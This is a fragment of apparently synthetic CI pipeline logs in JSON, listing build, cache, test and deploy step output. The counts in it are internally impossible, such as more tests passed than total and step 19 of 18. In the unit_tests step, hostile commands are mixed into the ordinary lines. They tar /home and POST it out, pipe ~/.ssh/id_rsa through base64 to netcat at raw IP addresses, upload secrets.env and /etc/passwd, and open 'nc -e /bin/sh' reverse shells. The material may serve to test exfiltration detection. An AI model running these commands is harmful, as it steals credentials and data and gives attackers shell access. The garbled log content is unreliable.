          "npm install: resolved 350 packages",
          "Success!",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Using Python 3.11",
          "[12:17:58] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "Pulling image: python:3.11",
          "[12:17:58] INFO: Request completed",
          "Ready.",
          "Minifying vendor.js",
          "Loading...",
          "Layer 2/11: RUN command",
          "Coverage: 80% statements, 81% branches",
          "Bundling runtime.js",
          "Using Node.js 14.5.7",
          "  PASS: integration/test_db_connect.spec.js",
          "\u2713 build completed",
          "Cache restored successfully (362MB)",
          "[12:17:58] INFO: Processing request",
          "OK",
          "Cache saved successfully",
          "pip: Downloading lodash-4.5.tar.gz",
          "POST /api - 200 (320ms)",
          "[12:17:58] ERROR: Connection failed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-17T12:19:00.377725",
        "finished_at": "2025-12-17T12:19:05.427834",
        "log_lines": [
          "=== Step: save_cache ===",
          "NODE_ENV=production",
          "Using Node.js 18.6.0",
          "[12:17:58] INFO: Processing request",
          "pip install: Successfully installed express-5.14",
          "Step 10/18: Building",
          "Exception: ValueError",
          "Installing react@5.7.7",
          "Installing lodash@4.14.6",
          "Transforming 558 files...",
          "Optimizing 79 modules...",
          "Installing prettier@1.2.1",
          "Success!",
          "[12:17:58] INFO: Connecting to database",
          "Cache miss for key-9413",
          "Snapshots: 17 passed, 18 total",
          "Using Node.js 14.17.2",
          "Compiling src/main.py...",
          "Using Python 3.9",
          "Compiling utils/main.py...",
          "[12:17:58] WARN: Deprecated API usage",
          "Finished.",
          "Minifying app.js",
          "Installing eslint@3.13.2",
          "  PASS: test_cache_hit (243ms)",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-337'",
          "Cache saved successfully",
          "Environment: test",
          "Optimizing 61 modules...",
          "Time: 80.978s",
          "[12:17:58] INFO: Starting build process",
          "pip install: Successfully installed jest-1.5",
          "POST /api - 200 (222ms)",
          "Environment: test",
          "Verifying...",
          "Minifying main.js",
          "POST /upload - 200 (500ms)",
          "TLS handshake completed",
          "npm install: added 168 packages",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (54MB)",
          "Artifact uploaded: dist.zip (69MB)",
          "Compiling src/service.java...",
          "Uploading artifact 'build' (41 files)",
          "[12:17:58] INFO: Request completed",
          "Optimizing 78 modules...",
          "Verifying...",
          "Ran 97 tests in 49s",
          "Step 10/17: Installing dependencies",
          "Completed.",
          "[12:17:58] DEBUG: Loading configuration",
          "Verifying...",
          "Bundling vendor.js",
          "pip: Downloading react-3.16.tar.gz",
          "Step 16/21: Testing",
          "Test Suites: 16 passed, 8 total",
          "Test Suites: 7 passed, 9 total",
          "Uploading artifact 'dist' (43 files)",
          "[12:17:58] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "[12:17:58] WARN: Deprecated API usage",
          "Snapshots: 26 passed, 29 total",
          "Step 4/22: Building",
          "Completed.",
          "\u2713 All checks passed",
          "Compiling src/handler.rs...",
          "pip: Installing build dependencies...",
          "Ready.",
          "Completed.",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "  PASS: test_api_health (398ms)",
          "[12:17:58] WARN: Deprecated API usage",
          "Step 1/21: Testing",
          "[12:17:58] DEBUG: Query executed in 95ms",
          "Step 11/17: Installing dependencies",
          "GET /status - 204 (21ms)",
          "Cache miss for key-9289",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Tests: 439 passed, 59 total",
          "Cache invalidated: node_modules",
          "pip: Collecting prettier",
          "Snapshots: 19 passed, 8 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 2/17: Building",
          "Done.",
          "POST /api - 200 (37ms)",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Time: 37.822s",
          "Generating source maps...",
          "TLS handshake completed",
          "Step 12/23: Building",
          "\u2717 build failed with exit code 90",
          "[12:17:58] ERROR: Connection failed",
          "WARNING: express has known vulnerabilities",
          "[12:17:58] DEBUG: Loading configuration",
          "Environment: staging",
          "[12:17:58] ERROR: Connection failed",
          "\u2713 validate completed",
          "Compiling lib/index.js...",
          "Test Suites: 49 passed, 25 total",
          "\u2717 build failed with exit code 25",
          "Installing webpack@4.18.2",
          "Completed.",
          "Cache miss for key-7461",
          "[12:17:58] INFO: Request completed",
          "Cache miss for key-5857",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-17T12:19:05.427834",
        "finished_at": "2025-12-17T12:19:30.678381",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Layer 2/8: ENV command",
          "Artifact downloaded: 4MB",
          "  PASS: test_api_health (153ms)",
          "Verifying...",
          "Waiting...",
          "Cache miss for key-3259",
          "Waiting...",
          "Step 17/17: Linting",
          "TLS handshake completed",
          "\u2713 package completed",
          "pip: Installing build dependencies...",
          "Minifying main.js",
          "Connecting to example.com:443...",
          "  PASS: test_api_health (221ms)",
          "Success!",
          "Bundling vendor.css",
          "Ready.",
          "Verifying...",
          "Cache saved successfully",
          "Already up to date.",
          "npm install: resolved 494 packages",
          "Test Suites: 33 passed, 42 total",
          "Optimizing 64 modules...",
          "Generating source maps...",
          "GET /api - 201 (38ms)",
          "Artifact downloaded: 6MB",
          "Time: 8.429s",
          "yarn add: Done in 30.31s",
          "[12:17:58] INFO: Request completed",
          "[12:17:58] ERROR: Connection failed",
          "pip: Collecting lodash",
          "[12:17:58] ERROR: Connection failed",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Cache refreshed",
          "Step 20/25: Building",
          "WARNING: prettier has known vulnerabilities",
          "Platform: darwin-arm64",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "Layer 3/11: RUN command",
          "Environment: test",
          "POST /api - 201 (101ms)",
          "Transforming 339 files...",
          "[12:17:58] INFO: Cache refreshed",
          "Image pulled successfully",
          "  PASS: integration/test_api_health.spec.js",
          "Waiting...",
          "OK",
          "WARNING: eslint has known vulnerabilities",
          "Optimizing 73 modules...",
          "Uploading artifact 'build' (49 files)",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed eslint-2.3",
          "Connection established",
          "Pulling image: node:3.11",
          "\u2717 build failed with exit code 76",
          "Building Docker image...",
          "Connecting to startup.dev:443...",
          "Success!",
          "Snapshots: 3 passed, 4 total",
          "[12:17:58] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (5 files)",
          "Connecting to startup.dev:443...",
          "[12:17:58] DEBUG: Query executed in 82ms",
          "Optimizing 60 modules...",
          "Compiling components/app.ts...",
          "Compiling utils/index.js...",
          "Step 5/22: Testing",
          "POST /api - 201 (262ms)",
          "TLS handshake completed",
          "[12:17:58] ERROR: Connection failed",
          "[12:17:58] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "Done.",
          "[12:17:58] DEBUG: Query executed in 80ms",
          "Layer 8/8: RUN command",
          "Layer 10/14: COPY command",
          "[12:17:58] ERROR: Connection failed",
          "Tests: 315 passed, 69 total",
          "pip: Downloading webpack-4.17.tar.gz",
          "Coverage: 92% statements, 85% branches",
          "[12:17:58] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (51MB)",
          "Ran 167 tests in 8s",
          "[12:17:58] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "[12:17:58] DEBUG: Connection pool: 8 active",
          "pip: Downloading webpack-5.11.tar.gz",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 1519ms",
          "Cache saved successfully",
          "pip install: Successfully installed axios-3.12",
          "Ready.",
          "[12:17:58] INFO: Request completed",
          "Compiling src/index.js...",
          "Switched to branch 'hotfix/task-155'",
          "FAILED: test_db_connect",
          "FAILED: test_cache_hit",
          "Processing...",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Cache miss for key-1050",
          "[12:17:58] INFO: Request completed",
          "Step 17/17: Linting",
          "npm install: resolved 738 packages",
          "Building Docker image...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-17T12:19:30.678381",
        "finished_at": "2025-12-17T12:19:39.095230",
        "log_lines": [
          "=== Step: type_check ===",
          "Cache restored successfully (337MB)",
          "Creating production build...",
          "Building Docker image...",
          "OK",
          "pip: Downloading eslint-2.15.tar.gz",
          "Already up to date.",
          "Layer 5/9: RUN command",
          "Generating source maps...",
          "Processing...",
          "Building Docker image...",
          "Optimizing 70 modules...",
          "OK",
          "Artifact downloaded: 8MB",
          "Connection established",
          "Cache restored successfully (238MB)",
          "Connection established",
          "Finished.",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Done.",
          "Step 1/25: Linting",
          "\u2713 Task completed in 3979ms",
          "[12:17:58] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 100",
          "[12:17:58] INFO: Request completed",
          "[12:17:58] WARN: Deprecated API usage",
          "Creating production build...",
          "[12:17:58] INFO: Processing request",
          "Building Docker image...",
          "Image pulled successfully",
          "Checking out main branch",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 14/24: Testing",
          "Snapshots: 9 passed, 11 total",
          "Cache invalidated: dependencies",
          "Uploading artifact 'dist' (36 files)",
          "Fetching submodules...",
          "npm install: resolved 1171 packages",
          "Artifact downloaded: 12MB",
          "TLS handshake completed",
          "OK",
          "[12:17:58] WARN: Deprecated API usage",
          "OK",
          "Ready.",
          "Fetching submodules...",
          "Tests: 136 passed, 460 total",
          "Finished.",
          "Uploading artifact 'build' (36 files)",
          "Test Suites: 39 passed, 47 total",
          "npm install: added 332 packages",
          "Snapshots: 50 passed, 35 total",
          "[12:17:58] INFO: Connecting to database",
          "[12:17:58] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (27MB)",
          "pip: Downloading prettier-4.10.tar.gz",
          "Connection established",
          "GET /health - 204 (11ms)",
          "[12:17:58] INFO: Starting build process",
          "Step 14/19: Linting",
          "Time: 82.455s",
          "[12:17:58] INFO: Starting build process",
          "  PASS: test_user_create (181ms)",
          "Coverage: 74% statements, 99% branches",
          "Tests: 379 passed, 484 total",
          "Cache restored successfully (11MB)",
          "  PASS: test_api_health (270ms)",
          "FAILED: test_db_connect",
          "Exception: RuntimeError",
          "Using Python 3.10",
          "npm notice: created a lockfile",
          "pip install: Successfully installed axios-1.15",
          "Step 2/15: Linting",
          "Transforming 968 files...",
          "Exception: RuntimeError",
          "Cache restored successfully (208MB)",
          "Pushing to registry...",
          "Test Suites: 13 passed, 37 total",
          "Uploading artifact 'coverage' (42 files)",
          "Cache restored successfully (79MB)",
          "Cache saved successfully",
          "Switched to branch 'hotfix/task-580'",
          "NODE_ENV=test",
          "npm install: added 490 packages",
          "Ready.",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (73MB)",
          "Artifact downloaded: 15MB",
          "Success!",
          "TLS handshake completed",
          "Step 17/18: Deploying",
          "Step 2/19: Testing",
          "Pulling image: alpine:3.11",
          "Minifying main.js",
          "Ran 142 tests in 36s",
          "Optimizing 70 modules...",
          "Using Node.js 19.16.9",
          "Step 8/15: Testing",
          "Finished.",
          "Step 7/21: Building",
          "Compiling utils/service.java...",
          "WARNING: eslint has known vulnerabilities",
          "Step 1/17: Testing",
          "pip: Installing build dependencies...",
          "Cache hit for key-3657",
          "Success!",
          "pip install: Successfully installed react-3.18",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-17T12:19:39.095230",
        "finished_at": "2025-12-17T12:19:42.461970",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Using Node.js 15.0.9",
          "Already up to date.",
          "Fetching submodules...",
          "TLS handshake completed",
          "[12:17:58] DEBUG: Memory usage: 649MB",
          "Pushing to registry...",
          "pip install: Successfully installed jest-3.7",
          "\u2717 build failed with exit code 36",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Layer 3/11: ENV command",
          "\u2717 build failed with exit code 14",
          "Step 6/22: Running migrations",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "Snapshots: 42 passed, 11 total",
          "Cache hit for key-7634",
          "Artifact uploaded: dist.zip (84MB)",
          "Minifying app.js",
          "Processing...",
          "\u2713 Step 'checkout' succeeded",
          "Minifying app.js",
          "  PASS: integration/test_user_create.spec.js",
          "Step 15/25: Deploying",
          "[12:17:58] WARN: Deprecated API usage",
          "Step 6/22: Installing dependencies",
          "[12:17:58] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (67MB)",
          "Completed.",
          "Switched to branch 'feature/task-945'",
          "Cache miss for key-7515",
          "HEAD is now at b02b689",
          "Layer 5/12: ENV command",
          "Cache invalidated: build",
          "[12:17:58] INFO: Cache refreshed",
          "Already up to date.",
          "Using Node.js 14.9.8",
          "Transforming 978 files...",
          "Ready.",
          "OK",
          "[12:17:58] INFO: Processing request",
          "Finished.",
          "WARNING: axios has known vulnerabilities",
          "Finished.",
          "npm notice: created a lockfile",
          "Coverage: 86% statements, 92% branches",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Ready.",
          "Finished.",
          "[12:17:58] INFO: Starting build process",
          "Loading...",
          "FAILED: test_db_connect",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 95 tests in 47s",
          "Completed.",
          "Transforming 726 files...",
          "Ready.",
          "Platform: darwin-arm64",
          "WARNING: webpack has known vulnerabilities",
          "Switched to branch 'hotfix/task-532'",
          "Completed.",
          "[12:17:58] DEBUG: Connection pool: 4 active",
          "Step 11/18: Running migrations",
          "Pushing to registry...",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 831 packages",
          "Environment: development",
          "Layer 2/14: COPY command",
          "Ran 159 tests in 56s",
          "Bundling vendor.css",
          "Finished.",
          "npm install: added 215 packages",
          "Time: 22.502s",
          "Cache miss for key-3766",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "Finished.",
          "Using Node.js 14.2.4",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 764 files...",
          "Test Suites: 44 passed, 28 total",
          "Pushing to registry...",
          "[12:17:58] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:17:58] INFO: Connecting to database",
          "[12:17:58] DEBUG: Memory usage: 1164MB",
          "Cache invalidated: dependencies",
          "Coverage: 90% statements, 83% branches",
          "Generating source maps...",
          "Success!",
          "Tests: 251 passed, 140 total",
          "Optimizing 18 modules...",
          "OK",
          "Pulling image: python:18",
          "Cache restored successfully (189MB)",
          "Installing react@4.1.0",
          "[12:17:58] DEBUG: Query executed in 14ms",
          "[12:17:58] INFO: Request completed",
          "Connection established",
          "[12:17:58] INFO: Starting build process",
          "Step 14/25: Installing dependencies",
          "Platform: darwin-arm64",
          "Ran 80 tests in 40s",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-17T12:19:42.461970",
        "finished_at": "2025-12-17T12:19:50.878819",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Waiting...",
          "Connection established",
          "Completed.",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Layer 5/8: RUN command",
          "Ran 61 tests in 60s",
          "Artifact uploaded: build.tar.gz (34MB)",
          "POST /api - 200 (178ms)",
          "Done.",
          "Environment: production",
          "[12:17:58] INFO: Processing request",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (396MB)",
          "Minifying main.js",
          "\u2713 validate completed",
          "Fetching submodules...",
          "Finished.",
          "Step 15/20: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 96% statements, 76% branches",
          "Ran 29 tests in 60s",
          "FAILED: test_auth_login",
          "Connection established",
          "pip: Collecting express",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Starting build process",
          "POST /api - 201 (153ms)",
          "OK",
          "Tests: 125 passed, 84 total",
          "Step 4/18: Testing",
          "Layer 6/9: RUN command",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache restored successfully (431MB)",
          "Layer 7/11: RUN command",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Cache refreshed",
          "Image pulled successfully",
          "OK",
          "Uploading artifact 'build' (41 files)",
          "[12:17:58] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "Transforming 375 files...",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Environment: development",
          "Step 4/15: Running migrations",
          "pip: Downloading webpack-1.12.tar.gz",
          "Compiling utils/service.java...",
          "Step 18/16: Building",
          "npm notice: package.json updated",
          "Transforming 123 files...",
          "Tests: 401 passed, 376 total",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Tests: 112 passed, 165 total",
          "[12:17:58] WARN: Deprecated API usage",
          "Connection established",
          "Fetching submodules...",
          "Step 9/24: Building",
          "NODE_ENV=development",
          "Generating source maps...",
          "HEAD is now at 7f35e15",
          "Generating source maps...",
          "Step 9/24: Running migrations",
          "Generating source maps...",
          "  PASS: test_user_create (222ms)",
          "[12:17:58] DEBUG: Memory usage: 1644MB",
          "\u2717 build failed with exit code 14",
          "  PASS: test_user_create (479ms)",
          "pip install: Successfully installed jest-2.1",
          "[12:17:58] INFO: Request completed",
          "HEAD is now at 4a36cac",
          "yarn add: Done in 20.85s",
          "pip: Downloading eslint-5.14.tar.gz",
          "npm install: resolved 1529 packages",
          "Waiting...",
          "Already up to date.",
          "[12:17:58] INFO: Connecting to database",
          "Compiling components/main.py...",
          "HEAD is now at fc035a0",
          "Using Node.js 15.3.1",
          "Snapshots: 22 passed, 8 total",
          "Exception: NullPointerException",
          "Loading...",
          "Already up to date.",
          "Artifact uploaded: dist.zip (3MB)",
          "Snapshots: 46 passed, 7 total",
          "[12:17:58] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Compiling src/service.java...",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 91",
          "Compiling components/index.js...",
          "[12:17:58] ERROR: Connection failed",
          "Cache invalidated: node_modules",
          "[12:17:58] INFO: Starting build process",
          "Completed.",
          "Artifact uploaded: build.tar.gz (24MB)",
          "npm notice: package.json updated",
          "WARNING: react has known vulnerabilities",
          "Step 4/22: Installing dependencies",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/app.ts...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-17T12:19:50.878819",
        "finished_at": "2025-12-17T12:19:59.295668",
        "log_lines": [
          "=== Step: lint ===",
          "Completed.",
          "Test Suites: 50 passed, 13 total",
          "Creating production build...",
          "Ran 128 tests in 37s",
          "Test Suites: 32 passed, 15 total",
          "[12:17:58] DEBUG: Memory usage: 1587MB",
          "Loading...",
          "Step 19/18: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "Layer 2/9: COPY command",
          "Uploading artifact 'build' (15 files)",
          "Transforming 930 files...",
          "Bundling styles.js",
          "Snapshots: 32 passed, 8 total",
          "[12:17:58] INFO: Cache refreshed",
          "npm install: added 303 packages",
          "Installing jest@1.20.7",
          "Cache miss for key-7054",
          "[12:17:58] DEBUG: Initializing service",
          "Step 3/19: Building",
          "Connection established",
          "Bundling runtime.js",
          "Using Python 3.12",
          "Compiling lib/app.ts...",
          "Step 14/20: Running migrations",
          "[12:17:58] INFO: Request completed",
          "\u2713 Step 'install' succeeded",
          "[12:17:58] DEBUG: Query executed in 97ms",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Waiting...",
          "Compiling utils/index.js...",
          "[12:17:58] WARN: Deprecated API usage",
          "Step 15/24: Testing",
          "Platform: linux-x64",
          "Ran 58 tests in 54s",
          "WARNING: express has known vulnerabilities",
          "pip: Collecting axios",
          "Loading...",
          "Exception: NullPointerException",
          "Compiling components/index.js...",
          "Cache saved successfully",
          "Loading...",
          "Already up to date.",
          "Time: 19.896s",
          "Step 11/21: Linting",
          "[12:17:58] INFO: Cache refreshed",
          "NODE_ENV=test",
          "Compiling src/handler.rs...",
          "Fetching submodules...",
          "[12:17:58] DEBUG: Loading configuration",
          "Step 9/15: Testing",
          "TLS handshake completed",
          "Cache restored successfully (319MB)",
          "Cache hit for key-2697",
          "\u2713 Step 'install' succeeded",
          "Compiling src/utils.go...",
          "[12:17:58] ERROR: Connection failed",
          "Creating production build...",
          "Compiling src/handler.rs...",
          "Cache invalidated: node_modules",
          "Installing prettier@1.0.4",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: dist.zip (31MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: unit/test_api_health.spec.js",
          "GET /api - 201 (8ms)",
          "Already up to date.",
          "[12:17:58] DEBUG: Memory usage: 370MB",
          "[12:17:58] INFO: Processing request",
          "FAILED: test_auth_login",
          "Fetching submodules...",
          "[12:17:58] DEBUG: Loading configuration",
          "Cache hit for key-9092",
          "Environment: development",
          "  PASS: test_api_health (241ms)",
          "[12:17:58] INFO: Starting build process",
          "Step 7/18: Linting",
          "[12:17:58] DEBUG: Query executed in 33ms",
          "Pushing to registry...",
          "[12:17:58] DEBUG: Loading configuration",
          "Creating production build...",
          "Using Node.js 16.6.6",
          "POST /api - 202 (378ms)",
          "  PASS: integration/test_user_create.spec.js",
          "\u2713 Task completed in 3417ms",
          "Success!",
          "POST /data - 201 (268ms)",
          "[12:17:58] INFO: Request completed",
          "Fetching submodules...",
          "Time: 103.803s",
          "Time: 93.147s",
          "Step 12/15: Deploying",
          "\u2717 build failed with exit code 71",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Snapshots: 23 passed, 16 total",
          "GET /status - 201 (44ms)",
          "WARNING: react has known vulnerabilities",
          "POST /data - 201 (23ms)",
          "[12:17:58] ERROR: Connection failed",
          "Done.",
          "Creating production build...",
          "[12:17:58] DEBUG: Query executed in 26ms",
          "Step 14/16: Linting",
          "\u2713 Step 'build' succeeded",
          "pip install: Successfully installed eslint-5.2",
          "Step 6/20: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-17T12:19:59.295668",
        "finished_at": "2025-12-17T12:20:04.345777",
        "log_lines": [
          "=== Step: restore_cache ===",
          "TLS handshake completed",
          "HEAD is now at 05020c2",
          "pip: Collecting jest",
          "POST /api - 202 (272ms)",
          "Processing...",
          "Done.",
          "\u2713 All checks passed",
          "[12:17:58] INFO: Processing request",
          "\u2713 Task completed in 2731ms",
          "Cache invalidated: node_modules",
          "Cache restored successfully (120MB)",
          "Cache miss for key-1097",
          "GET /status - 204 (36ms)",
          "Artifact uploaded: dist.zip (69MB)",
          "Loading...",
          "Snapshots: 11 passed, 39 total",
          "Creating production build...",
          "Snapshots: 27 passed, 43 total",
          "[12:17:58] DEBUG: Loading configuration",
          "yarn add: Done in 13.15s",
          "Bundling styles.js",
          "Step 12/19: Running migrations",
          "npm install: resolved 609 packages",
          "Optimizing 81 modules...",
          "Coverage: 95% statements, 68% branches",
          "Cache restored successfully (174MB)",
          "WARNING: prettier has known vulnerabilities",
          "[12:17:58] DEBUG: Loading configuration",
          "Bundling vendor.css",
          "\u2713 Step 'test' succeeded",
          "Using Python 3.11",
          "Test Suites: 29 passed, 15 total",
          "Step 9/17: Testing",
          "Waiting...",
          "Environment: development",
          "Done.",
          "Uploading artifact 'build' (6 files)",
          "Loading...",
          "npm install: added 113 packages",
          "Finished.",
          "Using Node.js 14.6.10",
          "Test Suites: 32 passed, 30 total",
          "Creating production build...",
          "Pulling image: alpine:latest",
          "Connection established",
          "Optimizing 58 modules...",
          "Image pulled successfully",
          "Minifying app.js",
          "[12:17:58] DEBUG: Query executed in 58ms",
          "Pushing to registry...",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Request completed",
          "yarn add: Done in 13.44s",
          "Building Docker image...",
          "TLS handshake completed",
          "Cache restored successfully (485MB)",
          "Cache saved successfully",
          "Compiling src/service.java...",
          "npm install: resolved 1545 packages",
          "Loading...",
          "[12:17:58] WARN: Deprecated API usage",
          "Checking out main branch",
          "TLS handshake completed",
          "  PASS: test_user_create (363ms)",
          "Exception: ValueError",
          "[12:17:58] INFO: Starting build process",
          "Cache miss for key-1096",
          "Pushing to registry...",
          "Installing jest@1.20.2",
          "WARNING: lodash has known vulnerabilities",
          "Processing...",
          "Bundling vendor.css",
          "Switched to branch 'feature/task-176'",
          "Step 7/25: Building",
          "WARNING: express has known vulnerabilities",
          "Uploading artifact 'coverage' (7 files)",
          "pip: Downloading lodash-2.13.tar.gz",
          "Success!",
          "Artifact uploaded: dist.zip (18MB)",
          "Building Docker image...",
          "Ready.",
          "[12:17:58] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (88MB)",
          "Snapshots: 28 passed, 9 total",
          "npm notice: package.json updated",
          "Processing...",
          "Transforming 276 files...",
          "Uploading artifact 'dist' (26 files)",
          "\u2713 Task completed in 362ms",
          "Cache restored successfully (208MB)",
          "GET /health - 204 (38ms)",
          "Compiling components/utils.go...",
          "Pulling image: alpine:latest",
          "Bundling vendor.js",
          "\u2713 validate completed",
          "pip install: Successfully installed react-1.15",
          "pip install: Successfully installed jest-1.2",
          "Creating production build...",
          "Installing eslint@1.2.5",
          "Verifying...",
          "npm install: resolved 1555 packages",
          "Snapshots: 46 passed, 0 total",
          "Snapshots: 19 passed, 42 total",
          "Compiling src/app.ts...",
          "Connecting to startup.dev:443...",
          "[12:17:58] DEBUG: Loading configuration",
          "Step 4/16: Deploying",
          "[12:17:58] DEBUG: Loading configuration",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-17T12:20:04.345777",
        "finished_at": "2025-12-17T12:20:29.596324",
        "log_lines": [
          "=== Step: unit_tests ===",
          "yarn add: Done in 9.86s",
          "npm notice: created a lockfile",
          "WARNING: webpack has known vulnerabilities",
          "npm install: added 97 packages",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Checking out master branch",
          "Optimizing 26 modules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 177.12.162.39 28251",
          "[12:17:58] DEBUG: Loading configuration",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Cache restored successfully (498MB)",
          "npm notice: package.json updated",
          "Step 11/19: Testing",
          "yarn add: Done in 20.26s",
          "pip: Collecting express",
          "Step 8/19: Building",
          "Step 1/19: Linting",
          "[12:17:58] DEBUG: Memory usage: 443MB",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "\u2713 build completed",
          "Step 3/16: Testing",
          "Waiting...",
          "\u2713 Task completed in 4609ms",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed jest-2.15",
          "[12:17:58] DEBUG: Initializing service",
          "Using Python 3.9",
          "\u2713 Task completed in 1514ms",
          "\u2713 Task completed in 1892ms",
          "Tests: 350 passed, 238 total",
          "WARNING: react has known vulnerabilities",
          "Optimizing 31 modules...",
          "[12:17:58] DEBUG: Connection pool: 18 active",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 211.220.215.245 42395",
          "Creating production build...",
          "Step 19/17: Installing dependencies",
          "Switched to branch 'feature/task-427'",
          "nc -e /bin/sh 16.139.248.18 62025",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Cache saved successfully",
          "Environment: production",
          "Time: 107.554s",
          "Minifying main.js",
          "nc -e /bin/sh 236.115.143.40 63269",
          "Installing react@2.8.5",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Installing react@4.15.4",
          "Installing eslint@4.12.8",
          "\u2713 Task completed in 442ms",
          "[12:17:58] WARN: Deprecated API usage",
          "Checking out main branch",
          "pip install: Successfully installed react-5.12",
          "npm install: added 78 packages",
          "Transforming 855 files...",
          "Optimizing 92 modules...",
          "Compiling src/utils.go...",
          "NODE_ENV=test",
          "Building Docker image...",
          "pip install: Successfully installed webpack-4.9",
          "Connecting to test.io:443...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 166.229.251.206 20155",
          "Processing...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 255.91.96.231 40390",
          "HEAD is now at f2c3a06",
          "Bundling styles.js",
          "nc -e /bin/sh 63.239.70.129 47770",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:17:58] DEBUG: Connection pool: 2 active",
          "Processing...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 246.222.209.179 65259",
          "Loading...",
          "Test Suites: 16 passed, 32 total",
          "Sending 174MB of data to startup.dev",
          "\u2713 validate completed",
          "Cache saved successfully",
          "[12:17:58] WARN: Deprecated API usage",
          "Test Suites: 9 passed, 22 total",
          "[12:17:58] DEBUG: Memory usage: 1364MB",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 74.69.210.31 62705",
          "[12:17:58] DEBUG: Memory usage: 167MB",
          "Cache saved successfully",
          "pip: Downloading axios-3.7.tar.gz",
          "[12:17:58] INFO: Connecting to database",
          "pip install: Successfully installed prettier-4.10",
          "Artifact downloaded: 11MB",
